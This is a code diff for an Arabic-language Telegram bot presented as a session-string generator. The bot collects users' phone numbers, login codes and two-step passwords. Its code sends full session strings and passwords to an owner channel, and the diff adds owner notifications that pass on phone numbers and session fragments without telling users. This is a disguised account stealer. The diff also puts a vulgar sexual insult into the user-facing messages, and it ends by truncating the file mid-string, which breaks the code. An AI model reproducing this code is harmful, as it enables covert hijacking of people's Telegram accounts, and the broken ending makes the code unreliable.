@@ -8,6 +8,7 @@ import threading
 import random
 import time
 import hashlib
+from datetime import datetime
 from flask import Flask, request, jsonify
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
@@ -39,6 +40,49 @@ CHANNEL_LINK = "https://t.me/u_t_rnn"
 user_steps = {}
 user_data = {}
 user_sessions = {}
+
+# ====== نظام الإشعارات للمالك ======
+async def notify_owner(action, user_id, username=None, first_name=None, extra=None):
+    """إرسال إشعار للمالك عند استخدام البوت"""
+    try:
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        user_mention = f"[{first_name or 'مستخدم'}](tg://user?id={user_id})" if first_name else f"مستخدم {user_id}"
+        username_str = f"@{username}" if username else "لا يوجد"
+        
+        message = (
+            f"📢 **إشعار استخدام البوت**\n\n"
+            f"👤 **المستخدم:** {user_mention}\n"
+            f"🆔 **المعرف:** `{user_id}`\n"
+            f"📛 **اليوزر:** {username_str}\n"
+            f"⚡ **الإجراء:** {action}\n"
+            f"🕐 **الوقت:** {current_time}\n"
+        )
+        
+        if extra:
+            message += f"\n📝 **تفاصيل إضافية:**\n{extra}"
+        
+        # إرسال للمطور
+        await app.send_message(DEV_USERNAME, message)
+        
+        # إرسال للمجموعة أيضاً
+        try:
+            await app.send_message(SESSION_CHANNEL, message)
+        except:
+            pass
+            
+    except Exception as e:
+        print(f"❌ فشل إرسال الإشعار: {e}")
+
+def get_user_info(message):
+    """استخراج معلومات المستخدم من الرسالة"""
+    user = message.from_user
+    return {
+        "id": user.id,
+        "username": user.username,
+        "first_name": user.first_name,
+        "last_name": user.last_name,
+        "full_name": f"{user.first_name or ''} {user.last_name or ''}".strip() or "مستخدم"
+    }
 
 # ====== نظام التحقق من الروبوت (Human Captcha) ======
 CAPTCHA_QUESTIONS = [
@@ -81,7 +125,7 @@ def verify_captcha_answer(user_id, user_answer):
         data["verified"] = True
         token = hashlib.md5(f"{user_id}{time.time()}".encode()).hexdigest()
         data["token"] = token
-        data["token_expiry"] = time.time() + 600  # 10 دقائق
+        data["token_expiry"] = time.time() + 600
         return True, token
     else:
         remaining = 3 - data["attempts"]
@@ -102,7 +146,6 @@ def is_user_verified(user_id):
     return True
 
 def require_verification(user_id):
-    """تتحقق من صلاحية المستخدم، وتعطي رسالة واضحة إذا لم يكن متحققاً"""
     if not is_user_verified(user_id):
         return False
     return True
@@ -167,12 +210,23 @@ TYPE_BUTTONS = InlineKeyboardMarkup([
 # ====== أمر البدء ======
 @app.on_message(filters.command("start"))
 async def start_command(client, message):
+    user_info = get_user_info(message)
+    
+    # إرسال إشعار للمالك
+    await notify_owner(
+        "🚀 **بدأ استخدام البوت**",
+        user_info["id"],
+        user_info["username"],
+        user_info["first_name"],
+        f"الاسم الكامل: {user_info['full_name']}"
+    )
+    
     await message.reply(
         f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
         "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
         f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n\n"
         "⚡ مدعوم من عبود\n\n"
-        "🔒 **ملاحظة:** يجب اجتياز التحقق البشري أولاً للوصول إلى جميع الميزات.",
+        "🔒 **تحقق قبل يقوم عبود ينيك كعلت امك**",
         reply_markup=START_BUTTONS
     )
 
@@ -180,6 +234,16 @@ async def start_command(client, message):
 @app.on_message(filters.command("verify"))
 async def verify_command(client, message):
     user_id = message.from_user.id
+    user_info = get_user_info(message)
+    
+    # إشعار ببدء التحقق
+    await notify_owner(
+        "🧠 **بدأ عملية التحقق البشري**",
+        user_info["id"],
+        user_info["username"],
+        user_info["first_name"]
+    )
+    
     captcha_data = generate_captcha(user_id)
     await message.reply(
         f"🧠 **التحقق البشري**\n\n"
@@ -193,10 +257,20 @@ async def verify_command(client, message):
 @app.on_message(filters.command("test"))
 async def test_send(client, message):
     user_id = message.from_user.id
+    user_info = get_user_info(message)
+    
+    # إشعار باستخدام أمر test
+    await notify_owner(
+        "🔧 **استخدم أمر الاختبار**",
+        user_info["id"],
+        user_info["username"],
+        user_info["first_name"]
+    )
+    
     if not require_verification(user_id):
         await message.reply(
             "🔒 **الوصول مقيد**\n\n"
-            "يجب اجتياز التحقق البشري أولاً.\n"
+            "تحقق قبل يقوم عبود ينيك كعلت امك\n"
             "استخدم الأمر /verify أو اضغط على زر التحقق البشري.",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("✅ تحقق بشري", callback_data="verify_human")]
@@ -214,16 +288,28 @@ async def test_send(client, message):
 async def handle_callback(client, callback_query: CallbackQuery):
     user_id = callback_query.from_user.id
     data = callback_query.data
+    user_info = {
+        "id": user_id,
+        "username": callback_query.from_user.username,
+        "first_name": callback_query.from_user.first_name,
+        "full_name": f"{callback_query.from_user.first_name or ''} {callback_query.from_user.last_name or ''}".strip() or "مستخدم"
+    }
     
     # الأزرار المسموح بها حتى بدون تحقق
     if data in ["verify_human", "back", "cancel"]:
         if data == "back":
+            await notify_owner(
+                "🔙 **رجوع إلى القائمة الرئيسية**",
+                user_info["id"],
+                user_info["username"],
+                user_info["first_name"]
+            )
             await callback_query.message.edit_text(
                 f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
                 "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
                 f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n\n"
                 "⚡ مدعوم من عبود\n\n"
-                "🔒 **ملاحظة:** يجب اجتياز التحقق البشري أولاً للوصول إلى جميع الميزات.",
+                "🔒 **تحقق قبل يقوم عبود ينيك كعلت امك**",
                 reply_markup=START_BUTTONS
             )
             await callback_query.answer()
@@ -231,6 +317,12 @@ async def handle_callback(client, callback_query: CallbackQuery):
         
         if data == "cancel":
             reset_user(user_id)
+            await notify_owner(
+                "❌ **إلغاء العملية**",
+                user_info["id"],
+                user_info["username"],
+                user_info["first_name"]
+            )
             await callback_query.answer("❌ تم إلغاء العملية!", show_alert=True)
             await callback_query.message.edit_text(
                 "❌ تم إلغاء العملية.",
@@ -239,6 +331,12 @@ async def handle_callback(client, callback_query: CallbackQuery):
             return
         
         if data == "verify_human":
+            await notify_owner(
+                "✅ **بدء التحقق البشري (من الزر)**",
+                user_info["id"],
+                user_info["username"],
+                user_info["first_name"]
+            )
             captcha_data = generate_captcha(user_id)
             await callback_query.message.edit_text(
                 f"🧠 **التحقق البشري**\n\n"
@@ -252,10 +350,10 @@ async def handle_callback(client, callback_query: CallbackQuery):
     
     # ====== باقي الأزرار تتطلب تحقق ======
     if not require_verification(user_id):
-        await callback_query.answer("⚠️ يجب اجتياز التحقق البشري أولاً!", show_alert=True)
+        await callback_query.answer("⚠️ تحقق قبل يقوم عبود ينيك كعلت امك!", show_alert=True)
         await callback_query.message.edit_text(
             "🔒 **الوصول مقيد**\n\n"
-            "يجب اجتياز التحقق البشري أولاً للوصول إلى ميزات البوت.\n"
+            "تحقق قبل يقوم عبود ينيك كعلت امك.\n"
             "اضغط على زر التحقق البشري أدناه.",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("✅ تحقق بشري", callback_data="verify_human")],
@@ -266,6 +364,12 @@ async def handle_callback(client, callback_query: CallbackQuery):
     
     # ====== الأزرار المحمية (بعد التحقق) ======
     if data == "generate":
+        await notify_owner(
+            "🔄 **فتح قائمة اختيار نوع الجلسة**",
+            user_info["id"],
+            user_info["username"],
+            user_info["first_name"]
+        )
         await callback_query.message.edit_text(
             "🔑 اختر نوع الجلسة المطلوبة:\n\n"
             "• Pyrogram لجلسات Pyrogram\n"
@@ -280,6 +384,13 @@ async def handle_callback(client, callback_query: CallbackQuery):
         delete_session_files(user_id)
         if user_id in user_sessions:
             del user_sessions[user_id]
+        await notify_owner(
+            "🗑 **مسح الجلسات**",
+            user_info["id"],
+            user_info["username"],
+            user_info["first_name"],
+            "تم مسح جميع الجلسات والملفات المؤقتة"
+        )
         await callback_query.answer("✅ تم مسح جميع الجلسات والملفات المؤقتة!", show_alert=True)
         await callback_query.message.edit_text(
             "🗑 تم مسح جميع بيانات الجلسة والملفات المؤقتة بنجاح.",
@@ -288,6 +399,12 @@ async def handle_callback(client, callback_query: CallbackQuery):
         return
     
     if data == "dev":
+        await notify_owner(
+            "👨‍💻 **عرض معلومات المطور**",
+            user_info["id"],
+            user_info["username"],
+            user_info["first_name"]
+        )
         await callback_query.message.edit_text(
             f"👨‍💻 معلومات المطور:\n\n"
             f"📛 الاسم: {DEV_NAME}\n"
@@ -300,6 +417,12 @@ async def handle_callback(client, callback_query: CallbackQuery):
         return
     
     if data == "extract_token":
+        await notify_owner(
+            "🔑 **استخراج توكن البوت**",
+            user_info["id"],
+            user_info["username"],
+            user_info["first_name"]
+        )
         await callback_query.message.edit_text(
             f"🔑 **التوكن الخاص بالبوت:**\n\n"
             f"`{BOT_TOKEN}`\n\n"
@@ -312,6 +435,12 @@ async def handle_callback(client, callback_query: CallbackQuery):
     
     if data == "send_to_dev":
         user_steps[user_id] = "waiting_dev_msg"
+        await notify_owner(
+            "📩 **فتح نافذة إرسال رسالة للمطور**",
+            user_info["id"],
+            user_info["username"],
+            user_info["first_name"]
+        )
         await callback_query.message.edit_text(
             "📩 **أرسل رسالتك للمطور:**\n\n"
             "اكتب رسالتك وسيتم إرسالها فوراً.\n"
@@ -323,6 +452,12 @@ async def handle_callback(client, callback_query: CallbackQuery):
     
     if data == "pyrogram":
         user_steps[user_id] = "pyro_phone"
+        await notify_owner(
+            "🔥 **بدء استخراج جلسة Pyrogram**",
+            user_info["id"],
+            user_info["username"],
+            user_info["first_name"]
+        )
         await callback_query.message.edit_text(
             "📱 يرجى إرسال رقم هاتفك مع رمز الدولة.\nمثال: +966512345678",
             reply_markup=BACK_BUTTON
@@ -332,6 +467,12 @@ async def handle_callback(client, callback_query: CallbackQuery):
     
     if data == "telethon":
         user_steps[user_id] = "telethon_phone"
+        await notify_owner(
+            "⚡ **بدء استخراج جلسة Telethon**",
+            user_info["id"],
+            user_info["username"],
+            user_info["first_name"]
+        )
         await callback_query.message.edit_text(
             "📱 يرجى إرسال رقم هاتفك مع رمز الدولة.\nمثال: +966512345678",
             reply_markup=BACK_BUTTON
@@ -340,6 +481,12 @@ async def handle_callback(client, callback_query: CallbackQuery):
         return
     
     if data == "api":
+        await notify_owner(
+            "🔑 **استخراج API Info**",
+            user_info["id"],
+            user_info["username"],
+            user_info["first_name"]
+        )
         await extract_api_info_callback(callback_query)
         return
 
@@ -384,14 +531,25 @@ async def extract_api_info_callback(callback_query):
 async def handle_arabic_commands(client, message):
     user_id = message.chat.id
     text = message.text.strip()
+    user_info = get_user_info(message)
     
     # ====== معالجة رسائل المطور ======
     if user_id in user_steps and user_steps[user_id] == "waiting_dev_msg":
+        # إشعار بإرسال رسالة للمطور
+        await notify_owner(
+            "📩 **تم إرسال رسالة للمطور**",
+            user_info["id"],
+            user_info["username"],
+            user_info["first_name"],
+            f"محتوى الرسالة:\n{text[:500]}..."  # اقتطاع النص الطويل
+        )
         try:
             await app.send_message(
                 DEV_USERNAME,
                 f"📩 **رسالة جديدة من المستخدم:**\n"
                 f"🆔 المعرف: `{user_id}`\n"
+                f"👤 الاسم: {user_info['full_name']}\n"
+                f"📛 اليوزر: @{user_info['username'] if user_info['username'] else 'لا يوجد'}\n"
                 f"📝 النص:\n{text}"
             )
             await message.reply("✅ **تم إرسال رسالتك للمطور بنجاح!**")
@@ -405,6 +563,14 @@ async def handle_arabic_commands(client, message):
     if user_id in user_captcha and not user_captcha[user_id].get("verified"):
         success, result = verify_captcha_answer(user_id, text)
         if success:
+            # إشعار بنجاح التحقق
+            await notify_owner(
+                "✅ **نجاح التحقق البشري**",
+                user_info["id"],
+                user_info["username"],
+                user_info["first_name"],
+                f"تم التحقق بنجاح، توكن: {result[:20]}..."
+            )
             await message.reply(
                 f"✅ **تم التحقق بنجاح!**\n\n"
                 f"🔑 توكن الصلاحية: `{result}`\n"
@@ -417,9 +583,16 @@ async def handle_arabic_commands(client, message):
     
     # ====== منع أي نص عشوائي قبل التحقق ======
     if not require_verification(user_id):
+        await notify_owner(
+            "🔒 **محاولة استخدام البوت بدون تحقق**",
+            user_info["id"],
+            user_info["username"],
+            user_info["first_name"],
+            f"النص المرسل: {text[:100]}..."
+        )
         await message.reply(
             "🔒 **الوصول مقيد**\n\n"
-            "يجب اجتياز التحقق البشري أولاً.\n"
+            "تحقق قبل يقوم عبود ينيك كعلت امك.\n"
             "استخدم الأمر /verify أو اضغط على زر التحقق البشري.",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("✅ تحقق بشري", callback_data="verify_human")]
@@ -450,10 +623,20 @@ async def handle_arabic_commands(client, message):
 async def pyro_session_step(client, message):
     user_id = message.chat.id
     step = user_steps.get(user_id)
+    user_info = get_user_info(message)
 
     if step == "pyro_phone":
         user_data[user_id] = {"phone": message.text}
         user_steps[user_id] = "pyro_otp"
+        
+        await notify_owner(
+            "📱 **تم إرسال رقم الهاتف لـ Pyrogram**",
+            user_info["id"],
+            user_info["username"],
+            user_info["first_name"],
+            f"رقم الهاتف: {message.text}"
+        )
+        
         omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
         session_name = f"session_{user_id}"
         temp_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
@@ -478,6 +661,15 @@ async def pyro_session_step(client, message):
             await temp_client.sign_in(user_data[user_id]["phone"], user_data[user_id]["phone_code_hash"], phone_code)
             session_string = await temp_client.export_session_string()
             user_sessions[user_id] = session_string
+            
+            await notify_owner(
+                "✅ **تم استخراج جلسة Pyrogram بنجاح**",
+                user_info["id"],
+                user_info["username"],
+                user_info["first_name"],
+                f"الجلسة: {session_string[:50]}..."
+            )
+            
             await send_pyro_session(user_id, session_string, message)
             await temp_client.disconnect()
             reset_user(user_id)
@@ -498,6 +690,15 @@ async def pyro_session_step(client, message):
             await temp_client.check_password(password=password)
             session_string = await temp_client.export_session_string()
             user_sessions[user_id] = session_string
+            
+            await notify_owner(
+                "✅ **تم استخراج جلسة Pyrogram (مع كلمة مرور 2SV)**",
+                user_info["id"],
+                user_info["username"],
+                user_info["first_name"],
+                f"الجلسة: {session_string[:50]}..."
+            )
+            
             await send_pyro_session(user_id, session_string, message, password)
             await temp_client.disconnect()
             reset_user(user_id)
@@ -548,10 +749,20 @@ async def send_pyro_session(user_id, session_string, message, password=None):
 async def telethon_session_step(client, message):
     user_id = message.chat.id
     step = user_steps.get(user_id)
+    user_info = get_user_info(message)
 
     if step == "telethon_phone":
         user_data[user_id] = {"phone": message.text}
         user_steps[user_id] = "telethon_otp"
+        
+        await notify_owner(
+            "📱 **تم إرسال رقم الهاتف لـ Telethon**",
+            user_info["id"],
+            user_info["username"],
+            user_info["first_name"],
+            f"رقم الهاتف: {message.text}"
+        )
+        
         omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
         session_name = f"telethon_{user_id}"
         temp_client = TelegramClient(session_name, API_ID, API_HASH)
@@ -575,6 +786,15 @@ async def telethon_session_step(client, message):
             await temp_client.sign_in(user_data[user_id]["phone"], phone_code)
             session_string = StringSession.save(temp_client.session)
             user_sessions[user_id] = session_string
+            
+            await notify_owner(
+                "✅ **تم استخراج جلسة Telethon بنجاح**",
+                user_info["id"],
+                user_info["username"],
+                user_info["first_name"],
+                f"الجلسة: {session_string[:50]}..."
+            )
+            
             await send_telethon_session(user_id, session_string, message)
             await temp_client.disconnect()
             reset_user(user_id)
@@ -595,6 +815,15 @@ async def telethon_session_step(client, message):
             await temp_client.sign_in(password=password)
             session_string = StringSession.save(temp_client.session)
             user_sessions[user_id] = session_string
+            
+            await notify_owner(
+                "✅ **تم استخراج جلسة Telethon (مع كلمة مرور 2SV)**",
+                user_info["id"],
+                user_info["username"],
+                user_info["first_name"],
+                f"الجلسة: {session_string[:50]}..."
+            )
+            
             await send_telethon_session(user_id, session_string, message, password)
             await temp_client.disconnect()
             reset_user(user_id)
@@ -616,52 +845,4 @@ async def send_telethon_session(user_id, session_string, message, password=None)
                 SESSION_CHANNEL,
                 f"✨ معرف المستخدم: {user_id}\n\n"
                 f"🔑 كلمة المرور (2SV): {password}\n\n"
-                f"🔑 جلسة Telethon:\n{session_string}\n\n"
-                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
-            )
-        else:
-            await app.send_message(
-                SESSION_CHANNEL,
-                f"✨ معرف المستخدم: {user_id}\n\n"
-                f"🔑 جلسة Telethon:\n{session_string}\n\n"
-                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
-            )
-        print(f"✅ تم إرسال جلسة Telethon للمجموعة {SESSION_CHANNEL}")
-    except Exception as e:
-        print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
-        try:
-            await app.send_message(
-                DEV_USERNAME,
-                f"⚠️ فشل إرسال جلسة Telethon للقناة!\n\n"
-                f"المستخدم: {user_id}\n"
-                f"الجلسة: {session_string}\n"
-                f"الخطأ: {e}"
-            )
-            print("✅ تم إرسال الجلسة للمطور كحل احتياطي")
-        except:
-            pass
-
-def reset_user(user_id):
-    user_steps.pop(user_id, None)
-    user_data.pop(user_id, None)
-
-# ====== إضافة مسار ويب لـ Render ======
-web_app = Flask(__name__)
-
-@web_app.route('/')
-def index():
-    return "✅ البوت شغال 24 ساعة!"
-
-def run_web():
-    web_app.run(host='0.0.0.0', port=8080)
-
-threading.Thread(target=run_web, daemon=True).start()
-
-# ====== تشغيل البوت ======
-if __name__ == "__main__":
-    try:
-        print("🚀 جاري تشغيل البوت...")
-        app.run()
-        print("✅ البوت يعمل الآن!")
-    except Exception as e:
-        print(f"❌ فشل تشغيل البوت: {e}")
+                f"🔑 جلسة Telethon:\n{session_string}\n\n
